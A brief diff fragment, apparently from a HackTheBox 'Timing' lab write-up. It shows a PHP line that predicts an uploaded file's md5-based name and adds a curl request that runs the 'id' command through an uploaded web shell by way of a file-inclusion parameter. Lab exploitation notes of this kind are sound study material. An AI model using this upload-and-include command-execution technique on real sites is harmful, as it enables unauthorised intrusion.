@@ -68,3 +68,5 @@ Thu, 19 Nov 1981 08:52:00 GMT
 
 $file_name = md5('$file_hash' . strtotime("08:52:00"));echo $file_name;
 
+ curl 'http://timing.htb/image.php?img=images/uploads/e386dadae01c949d05a461b58477c0af_demo.jpg&cmd=id'
+
